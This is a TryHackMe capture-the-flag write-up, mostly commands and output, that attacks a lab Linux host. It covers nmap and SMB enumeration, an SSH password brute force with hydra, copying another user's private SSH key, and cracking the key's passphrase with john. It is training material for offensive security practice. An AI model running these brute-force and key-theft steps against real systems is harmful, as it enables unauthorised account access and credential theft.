#TryHackMe #linux 
# Enumeration
## Nmap
PORT     STATE SERVICE     VERSION
```
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db45cbbe4a8b71f8e93142aefff845e4 (RSA)
|   256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ECDSA)
|_  256 a5682b225f984a62213da2e2c5a9f7c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
```
## SMB
┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Basic_Pentesting]
└─# smbclient -N -L \\\\10.10.197.244\\                  
        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Basic_Pentesting]
└─# smbclient -N \\\\10.10.197.244\\Anonymous 
	Try "help" to get a list of possible commands.
	smb: \> ls
	  .                                   D        0  Thu Apr 19 13:31:20 2018
	  ..                                  D        0  Thu Apr 19 13:13:06 2018
	  staff.txt                           N      173  Thu Apr 19 13:29:55 2018
	                14318640 blocks of size 1024. 11093364 blocks available
	smb: \> get staff.txt
	getting file \staff.txt of size 173 as staff.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
	smb: \> 

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Basic_Pentesting]
└─# cat staff.txt
	Announcement to staff:
	PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
	this is how mistakes happen. (This means you too, [Jan]!)

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Basic_Pentesting]
└─# enum4linux 10.10.197.244
	...SNIP...
	S-1-22-1-1000 Unix User/kay (Local User)                                                     
	S-1-22-1-1001 Unix User/[jan] (Local User)


# Exploit
[┌──(root㉿kali)-/media/sf_kali_partage/challenge/THM/Basic_Pentesting
└─#] hydra 10.10.197.244 -s 22 ssh -l jan -P /usr/share/wordlists/rockyou.txt
	`[22][ssh]` host: 10.10.197.244   login: [jan]   password: [armando]


# FootHold
┌──(root㉿kali)-[~]
└─# ssh jan@thm

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Basic_Pentesting]
└─# scp jan@thm:/home/kay/.ssh/id_rsa /media/sf_kali_partage/challenge/THM/Basic_Pentesting
	jan@thm's password: 
	id_rsa                               100% 3326     4.8KB/s   00:00  

# PrivEsc
┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Basic_Pentesting]
└─# ssh2john kay_id_rsa > kay_id_rsa_hash

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Basic_Pentesting]
└─# john kay_id_rsa_hash -wordlist=/usr/share/wordlists/rockyou.txt 
	Using default input encoding: UTF-8
	Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
	Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
	Cost 2 (iteration count) is 1 for all loaded hashes
	Will run 2 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	[beeswax ]         (kay_id_rsa)

┌──(root㉿kali)-[/media/sf_kali_partage/challenge/THM/Basic_Pentesting]
└─# ssh kay@thm -i /kay_id_rsa

kay@basic2:~$ id
	uid=1000(kay) gid=1000(kay) groups=1000(kay),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
